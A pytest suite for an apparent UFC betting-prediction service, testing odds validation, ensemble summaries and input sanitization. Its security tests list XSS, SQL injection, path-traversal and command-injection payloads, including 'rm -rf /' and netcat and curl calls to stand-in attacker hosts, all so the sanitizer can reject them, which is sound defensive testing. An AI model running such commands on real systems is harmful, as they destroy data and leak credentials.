#!/usr/bin/env python3
"""
Unit Tests for Enhanced UFC Prediction Service

Tests the enhanced prediction service with comprehensive validation of
input sanitization, ensemble integration, and confidence intervals.
"""

import pytest
import numpy as np
import pandas as pd
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import unicodedata
import re

# Add src to path
sys.path.append(str(Path(__file__).parent.parent.parent / 'src'))

from src.agent.services.enhanced_prediction_service import (
    EnhancedUFCPredictionService,
    EnhancedPredictionResult,
    EnhancedPredictionAnalysis
)


class TestEnhancedPredictionResult:
    """Test suite for EnhancedPredictionResult"""
    
    def test_enhanced_result_creation(self):
        """Test enhanced result creation with ensemble attributes"""
        result = EnhancedPredictionResult("fight_1", "Jon Jones", "Daniel Cormier")
        
        # Check base attributes inherited
        assert result.fight_key == "fight_1"
        assert result.fighter_a == "Jon Jones"
        assert result.fighter_b == "Daniel Cormier"
        
        # Check enhanced attributes
        assert result.ensemble_breakdown == {}
        assert result.confidence_interval == (0.0, 1.0)
        assert result.uncertainty_score == 0.0
        assert result.data_quality_score == 0.0
        assert result.ensemble_confidence == 0.0


class TestEnhancedPredictionAnalysis:
    """Test suite for EnhancedPredictionAnalysis"""
    
    def test_enhanced_analysis_creation(self):
        """Test enhanced analysis creation with ensemble metrics"""
        analysis = EnhancedPredictionAnalysis("UFC 300")
        
        # Check base attributes
        assert analysis.event_name == "UFC 300"
        
        # Check ensemble summary
        assert 'mean_confidence_interval_width' in analysis.ensemble_summary
        assert 'mean_uncertainty_score' in analysis.ensemble_summary
        assert 'mean_data_quality_score' in analysis.ensemble_summary
        assert 'high_uncertainty_predictions' in analysis.ensemble_summary
        assert 'ensemble_agreement_rate' in analysis.ensemble_summary


class TestEnhancedUFCPredictionService:
    """Test suite for EnhancedUFCPredictionService"""
    
    def setup_method(self):
        """Set up test fixtures"""
        # Mock betting system
        self.betting_system = {
            'fighters_df': pd.DataFrame({'fighter': ['Jon Jones', 'Daniel Cormier']}),
            'winner_cols': ['reach_diff', 'height_diff', 'age_diff'],
            'method_cols': ['striking_diff', 'grappling_diff'],
            'winner_model': Mock(),
            'method_model': Mock(),
            'predict_function': Mock()
        }
        
        # Configure mock predict function
        self.betting_system['predict_function'].return_value = {
            'winner_prob': 0.65,
            'method': 'Decision'
        }
        
        # Mock ensemble manager
        self.mock_ensemble_manager = Mock()
        self.mock_ensemble_manager.is_trained = True
        self.mock_ensemble_manager.predict_with_confidence.return_value = []
        
        # Mock confidence calculator
        self.mock_confidence_calculator = Mock()
        
        # Create service
        self.service = EnhancedUFCPredictionService(
            betting_system=self.betting_system,
            ensemble_manager=self.mock_ensemble_manager,
            confidence_calculator=self.mock_confidence_calculator
        )
    
    def test_initialization_with_mocks(self):
        """Test service initialization with provided components"""
        assert self.service.ensemble_manager == self.mock_ensemble_manager
        assert self.service.confidence_calculator == self.mock_confidence_calculator
    
    def test_initialization_auto_creation(self):
        """Test service initialization with auto-created components"""
        # Test without ensemble manager
        service = EnhancedUFCPredictionService(self.betting_system)
        
        assert service.betting_system == self.betting_system
        assert service.confidence_calculator is not None
    
    def test_has_ensemble_models_true(self):
        """Test ensemble model detection when models exist"""
        betting_system_with_models = {
            **self.betting_system,
            'xgboost_model': Mock()
        }
        
        service = EnhancedUFCPredictionService(betting_system_with_models)
        assert service._has_ensemble_models()
    
    def test_has_ensemble_models_false(self):
        """Test ensemble model detection when models don't exist"""
        assert not self.service._has_ensemble_models()
    
    def test_sanitize_event_name_valid(self):
        """Test event name sanitization with valid input"""
        valid_names = [
            "UFC 300: Main Event",
            "Bellator 250",
            "ONE Championship 123",
            "UFC Fight Night: Vegas"
        ]
        
        for name in valid_names:
            sanitized = self.service._sanitize_event_name(name)
            assert sanitized
            assert len(sanitized) <= 200
            # Should not contain dangerous characters
            assert not any(char in sanitized for char in '<>"\\&|`${}()')
    
    def test_sanitize_event_name_unicode(self):
        """Test event name sanitization with unicode characters"""
        unicode_name = "UFC São Paulo: Événement Principal"
        sanitized = self.service._sanitize_event_name(unicode_name)
        
        assert sanitized
        assert "São Paulo" in sanitized or "Sao Paulo" in sanitized
    
    def test_sanitize_event_name_invalid_characters(self):
        """Test event name sanitization rejects invalid characters"""
        malicious_names = [
            "UFC 300<script>alert('xss')</script>",
            "UFC 300'; DROP TABLE fights; --",
            "UFC 300$(malicious_command)",
            "UFC 300|rm -rf /"
        ]
        
        for name in malicious_names:
            with pytest.raises(ValueError, match="contains invalid characters"):
                self.service._sanitize_event_name(name)
    
    def test_sanitize_fighter_name_valid(self):
        """Test fighter name sanitization with valid names"""
        valid_names = [
            "Jon Jones",
            "José Aldo",
            "Khabib Nurmagomedov",
            "O'Malley",
            "St-Pierre",
            "Fábio Maldonado",
            "Cédric Doumbé"
        ]
        
        for name in valid_names:
            sanitized = self.service._sanitize_fighter_name(name)
            assert sanitized
            assert len(sanitized) >= 2
            assert len(sanitized) <= 100
            # Check that legitimate characters are preserved
            assert re.match(r'^[a-zA-ZÀ-ÿ\u0100-\u017F\u0400-\u04FF\s\-\'\.\,]+$', sanitized)
    
    def test_sanitize_fighter_name_unicode_normalization(self):
        """Test fighter name unicode normalization"""
        # Test with different unicode representations
        name_nfc = "José"  # NFC normalization
        name_nfd = "José"  # NFD normalization (if different)
        
        sanitized_nfc = self.service._sanitize_fighter_name(name_nfc)
        sanitized_nfd = self.service._sanitize_fighter_name(name_nfd)
        
        # Should normalize to same result
        assert sanitized_nfc == sanitized_nfd
        assert "José" in sanitized_nfc
    
    def test_sanitize_fighter_name_invalid_input(self):
        """Test fighter name sanitization with invalid input"""
        invalid_names = [
            "",
            None,
            123,
            "A",  # Too short
            "Fighter<script>alert('xss')</script>",
            "'; DROP TABLE fighters; --",
            "$(rm -rf /)",
            "http://malicious.com",
            "javascript:alert(1)"
        ]
        
        for name in invalid_names:
            with pytest.raises(ValueError):
                self.service._sanitize_fighter_name(name)
    
    def test_sanitize_fighter_name_suspicious_patterns(self):
        """Test fighter name rejects suspicious patterns"""
        suspicious_names = [
            "fighter script",
            "select * from fighters",
            "../../../etc/passwd",
            "http://evil.com"
        ]
        
        for name in suspicious_names:
            with pytest.raises(ValueError, match="suspicious pattern"):
                self.service._sanitize_fighter_name(name)
    
    def test_validate_odds_value_valid(self):
        """Test odds value validation with valid values"""
        valid_odds = [1.01, 1.5, 2.0, 3.5, 10.0, 25.0, 50.0]
        
        for odds in valid_odds:
            validated = self.service._validate_odds_value(odds, "test_odds")
            assert validated == float(odds)
            assert 1.01 <= validated <= 50.0
    
    def test_validate_odds_value_invalid_type(self):
        """Test odds value validation with invalid types"""
        invalid_odds = [None, "not_a_number", [], {}, object()]
        
        for odds in invalid_odds:
            with pytest.raises(ValueError, match="must be a valid number"):
                self.service._validate_odds_value(odds, "test_odds")
    
    def test_validate_odds_value_out_of_range(self):
        """Test odds value validation with out-of-range values"""
        out_of_range_odds = [0.5, 1.0, 51.0, 100.0, -1.0]
        
        for odds in out_of_range_odds:
            with pytest.raises(ValueError):
                self.service._validate_odds_value(odds, "test_odds")
    
    def test_validate_single_fight_valid(self):
        """Test single fight validation with valid data"""
        valid_fight = {
            'fighter_a': 'Jon Jones',
            'fighter_b': 'Daniel Cormier',
            'fighter_a_decimal_odds': 1.5,
            'fighter_b_decimal_odds': 2.5
        }
        
        validated = self.service._validate_single_fight("fight_1", valid_fight)
        
        assert validated['fighter_a'] == 'Jon Jones'
        assert validated['fighter_b'] == 'Daniel Cormier'
        assert validated['fighter_a_decimal_odds'] == 1.5
        assert validated['fighter_b_decimal_odds'] == 2.5
    
    def test_validate_single_fight_missing_fields(self):
        """Test single fight validation with missing fields"""
        incomplete_fight = {
            'fighter_a': 'Jon Jones',
            # Missing fighter_b and odds
        }
        
        with pytest.raises(ValueError, match="Missing required fields"):
            self.service._validate_single_fight("fight_1", incomplete_fight)
    
    def test_validate_single_fight_same_fighters(self):
        """Test single fight validation with same fighter names"""
        same_fighter_fight = {
            'fighter_a': 'Jon Jones',
            'fighter_b': 'Jon Jones',  # Same fighter
            'fighter_a_decimal_odds': 1.5,
            'fighter_b_decimal_odds': 2.5
        }
        
        with pytest.raises(ValueError, match="cannot be identical"):
            self.service._validate_single_fight("fight_1", same_fighter_fight)
    
    def test_validate_single_fight_suspicious_odds(self):
        """Test single fight validation with suspicious odds"""
        # Odds that imply probabilities summing to way off 1.0
        suspicious_fight = {
            'fighter_a': 'Jon Jones',
            'fighter_b': 'Daniel Cormier',
            'fighter_a_decimal_odds': 10.0,  # 10% implied probability
            'fighter_b_decimal_odds': 10.0   # 10% implied probability, total 20%
        }
        
        with pytest.raises(ValueError, match="Suspicious odds"):
            self.service._validate_single_fight("fight_1", suspicious_fight)
    
    def test_validate_and_sanitize_inputs_valid(self):
        """Test comprehensive input validation with valid data"""
        valid_odds_data = {
            'fight_1': {
                'fighter_a': 'Jon Jones',
                'fighter_b': 'Daniel Cormier',
                'fighter_a_decimal_odds': 1.8,
                'fighter_b_decimal_odds': 2.2
            },
            'fight_2': {
                'fighter_a': 'José Aldo',
                'fighter_b': 'Conor McGregor',
                'fighter_a_decimal_odds': 2.5,
                'fighter_b_decimal_odds': 1.6
            }
        }
        
        validated_odds, sanitized_event = self.service._validate_and_sanitize_inputs(
            valid_odds_data, "UFC 300"
        )
        
        assert len(validated_odds) == 2
        assert sanitized_event == "UFC 300"
        assert 'fight_1' in validated_odds
        assert 'fight_2' in validated_odds
    
    def test_validate_and_sanitize_inputs_empty_odds(self):
        """Test input validation with empty odds data"""
        with pytest.raises(ValueError, match="Odds data cannot be empty"):
            self.service._validate_and_sanitize_inputs({}, "UFC 300")
    
    def test_validate_and_sanitize_inputs_too_many_fights(self):
        """Test input validation with too many fights"""
        too_many_fights = {}
        for i in range(20):  # More than 15 limit
            too_many_fights[f'fight_{i}'] = {
                'fighter_a': f'Fighter_A_{i}',
                'fighter_b': f'Fighter_B_{i}',
                'fighter_a_decimal_odds': 1.8,
                'fighter_b_decimal_odds': 2.2
            }
        
        with pytest.raises(ValueError, match="Too many fights"):
            self.service._validate_and_sanitize_inputs(too_many_fights, "UFC 300")
    
    def test_validate_and_sanitize_inputs_invalid_event_name(self):
        """Test input validation with invalid event name"""
        valid_odds = {
            'fight_1': {
                'fighter_a': 'Jon Jones',
                'fighter_b': 'Daniel Cormier',
                'fighter_a_decimal_odds': 1.8,
                'fighter_b_decimal_odds': 2.2
            }
        }
        
        with pytest.raises(ValueError, match="Event name must be a non-empty string"):
            self.service._validate_and_sanitize_inputs(valid_odds, "")
        
        with pytest.raises(ValueError, match="Event name must be a non-empty string"):
            self.service._validate_and_sanitize_inputs(valid_odds, None)
    
    def test_predict_event_with_ensemble(self):
        """Test event prediction using ensemble"""
        # Setup mock ensemble prediction
        from src.ensemble_manager import EnsemblePrediction
        mock_ensemble_pred = Mock()
        mock_ensemble_pred.fighter_a = "Jon Jones"
        mock_ensemble_pred.fighter_b = "Daniel Cormier"
        mock_ensemble_pred.ensemble_probability = 0.65
        mock_ensemble_pred.model_breakdown = {'rf': 0.6, 'xgb': 0.7}
        mock_ensemble_pred.confidence_interval = (0.55, 0.75)
        mock_ensemble_pred.uncertainty_score = 0.20
        mock_ensemble_pred.data_quality_score = 0.85
        
        self.mock_ensemble_manager.predict_with_confidence.return_value = [mock_ensemble_pred]
        
        # Mock validation framework
        with patch('src.agent.services.enhanced_prediction_service.validate_ufc_fighter_pair') as mock_validate:
            mock_validate.return_value = ("Jon Jones", "Daniel Cormier")
            
            with patch('src.agent.services.enhanced_prediction_service.validate_ufc_prediction_dataframe') as mock_validate_df:
                mock_validate_df.return_value = pd.DataFrame(np.random.randn(1, 5))
                
                # Test data
                odds_data = {
                    'fight_1': {
                        'fighter_a': 'Jon Jones',
                        'fighter_b': 'Daniel Cormier',
                        'fighter_a_decimal_odds': 1.8,
                        'fighter_b_decimal_odds': 2.2
                    }
                }
                
                analysis = self.service.predict_event(odds_data, "UFC 300")
                
                assert isinstance(analysis, EnhancedPredictionAnalysis)
                assert analysis.event_name == "UFC 300"
    
    def test_predict_event_validation_failure(self):
        """Test event prediction with validation failures"""
        # Test with invalid odds data
        with pytest.raises(ValueError):
            self.service.predict_event({}, "UFC 300")
        
        # Test with invalid event name
        valid_odds = {
            'fight_1': {
                'fighter_a': 'Jon Jones',
                'fighter_b': 'Daniel Cormier',
                'fighter_a_decimal_odds': 1.8,
                'fighter_b_decimal_odds': 2.2
            }
        }
        
        with pytest.raises(ValueError):
            self.service.predict_event(valid_odds, "")
    
    def test_convert_to_enhanced_analysis(self):
        """Test conversion from base analysis to enhanced analysis"""
        # Mock base analysis
        from src.agent.services.prediction_service import PredictionAnalysis, PredictionResult
        
        base_analysis = PredictionAnalysis("UFC 300")
        base_result = PredictionResult("fight_1", "Jon Jones", "Daniel Cormier")
        base_result.model_prediction_a = 0.4
        base_result.model_prediction_b = 0.6
        base_result.confidence_score = 0.8
        base_analysis.fight_predictions.append(base_result)
        
        enhanced_analysis = self.service._convert_to_enhanced_analysis(base_analysis)
        
        assert isinstance(enhanced_analysis, EnhancedPredictionAnalysis)
        assert enhanced_analysis.event_name == "UFC 300"
        assert len(enhanced_analysis.fight_predictions) == 1
        
        enhanced_result = enhanced_analysis.fight_predictions[0]
        assert isinstance(enhanced_result, EnhancedPredictionResult)
        assert enhanced_result.confidence_interval == (0.1, 0.9)  # Default wide interval
        assert enhanced_result.uncertainty_score == 0.8
    
    def test_calculate_ensemble_summary(self):
        """Test ensemble summary calculation"""
        analysis = EnhancedPredictionAnalysis("UFC 300")
        
        # Add enhanced results
        for i in range(3):
            result = EnhancedPredictionResult(f"fight_{i}", f"Fighter_A_{i}", f"Fighter_B_{i}")
            result.confidence_interval = (0.4, 0.8)
            result.uncertainty_score = 0.3
            result.data_quality_score = 0.9
            analysis.fight_predictions.append(result)
        
        self.service._calculate_ensemble_summary(analysis)
        
        summary = analysis.ensemble_summary
        assert summary['mean_confidence_interval_width'] == 0.4  # 0.8 - 0.4
        assert summary['mean_uncertainty_score'] == 0.3
        assert summary['mean_data_quality_score'] == 0.9
        assert summary['high_uncertainty_predictions'] == 3  # All above 0.3 threshold
        assert summary['ensemble_agreement_rate'] == 0.0  # All CIs are wide (0.4 > 0.2)
    
    def test_enhanced_upset_opportunity_detection(self):
        """Test enhanced upset opportunity detection"""
        result = EnhancedPredictionResult("fight_1", "Jon Jones", "Daniel Cormier")
        result.model_prediction_a = 0.7
        result.model_prediction_b = 0.3
        result.model_favorite = "Jon Jones"
        result.model_favorite_prob = 0.7
        result.confidence_interval = (0.6, 0.8)  # Narrow CI
        result.ensemble_confidence = 0.9  # High confidence
        
        # Mock market data for upset detection
        result.market_favorite = "Daniel Cormier"  # Market disagrees with model
        
        # Mock base upset detection
        with patch.object(self.service, '_is_upset_opportunity', return_value=True):
            is_upset = self.service._is_enhanced_upset_opportunity(result)
            assert is_upset  # Should detect high-confidence upset
    
    def test_enhanced_high_confidence_detection(self):
        """Test enhanced high confidence detection"""
        result = EnhancedPredictionResult("fight_1", "Jon Jones", "Daniel Cormier")
        result.model_favorite_prob = 0.7
        result.confidence_interval = (0.6, 0.75)  # Narrow CI
        result.data_quality_score = 0.85
        result.market_favorite = "Jon Jones"
        result.model_favorite = "Jon Jones"  # Market and model agree
        
        # Mock base high confidence detection
        with patch.object(self.service, '_is_high_confidence', return_value=False):
            is_high_conf = self.service._is_enhanced_high_confidence(result)
            assert is_high_conf  # Should detect ensemble high confidence


class TestInputSanitizationSecurity:
    """Security-focused tests for input sanitization"""
    
    def setup_method(self):
        """Set up minimal service for security testing"""
        betting_system = {
            'fighters_df': pd.DataFrame(),
            'winner_cols': [],
            'method_cols': [],
            'winner_model': Mock(),
            'method_model': Mock(),
            'predict_function': Mock()
        }
        self.service = EnhancedUFCPredictionService(betting_system)
    
    def test_xss_prevention_event_name(self):
        """Test XSS attack prevention in event names"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "onload=alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            with pytest.raises(ValueError):
                self.service._sanitize_event_name(payload)
    
    def test_sql_injection_prevention_fighter_names(self):
        """Test SQL injection prevention in fighter names"""
        sql_payloads = [
            "'; DROP TABLE fighters; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT password FROM users --",
            "admin'; DELETE FROM fights; --"
        ]
        
        for payload in sql_payloads:
            with pytest.raises(ValueError):
                self.service._sanitize_fighter_name(payload)
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_payloads:
            with pytest.raises(ValueError):
                self.service._sanitize_fighter_name(payload)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        command_payloads = [
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "; rm -rf /",
            "| nc attacker.com 4444",
            "&& curl evil.com"
        ]
        
        for payload in command_payloads:
            with pytest.raises(ValueError):
                self.service._sanitize_fighter_name(payload)
    
    def test_unicode_attack_prevention(self):
        """Test unicode-based attack prevention"""
        # Test various unicode attack vectors
        unicode_attacks = [
            "\u0000",  # Null byte
            "\u0001",  # Control character
            "\uFEFF",  # BOM
            "\u200B",  # Zero-width space
            "\u202E",  # Right-to-left override
        ]
        
        for attack in unicode_attacks:
            fighter_name = f"Fighter{attack}Name"
            # Should either sanitize or reject
            try:
                sanitized = self.service._sanitize_fighter_name(fighter_name)
                # If sanitized, should not contain the attack character
                assert attack not in sanitized
            except ValueError:
                # Rejection is also acceptable
                pass
    
    def test_international_names_preserved(self):
        """Test that legitimate international names are preserved"""
        legitimate_names = [
            "José Aldo",
            "Cédric Doumbé", 
            "Khabib Nurmagomedov",
            "Антон Волков",  # Cyrillic
            "Zhang Weili",  # Chinese
            "Gökhan Saki",  # Turkish
            "João Carvalho",  # Portuguese
            "Michał Oleksiejczuk"  # Polish
        ]
        
        for name in legitimate_names:
            try:
                sanitized = self.service._sanitize_fighter_name(name)
                # Should preserve the essence of the name
                assert len(sanitized) >= 2
                # Should not remove all non-ASCII characters
                assert sanitized.strip()
            except ValueError as e:
                pytest.fail(f"Legitimate name '{name}' was rejected: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])